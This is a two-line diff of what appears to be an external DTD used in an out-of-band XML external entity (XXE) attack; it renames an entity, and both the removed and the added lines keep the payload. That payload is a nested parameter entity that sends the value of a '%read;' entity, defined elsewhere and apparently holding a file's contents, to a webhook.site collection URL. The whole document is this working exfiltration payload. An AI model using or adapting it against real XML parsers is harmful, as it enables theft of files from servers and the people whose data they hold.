@@ -1,2 +1,2 @@
-<!ENTITY % all "<!ENTITY req SYSTEM 'https://webhook.site/a12efe03-5ae3-4d3d-8f77-4522ca602d0a?%read;'>">
+<!ENTITY % all "<!ENTITY request SYSTEM 'https://webhook.site/a12efe03-5ae3-4d3d-8f77-4522ca602d0a?%read;'>">
 %all;
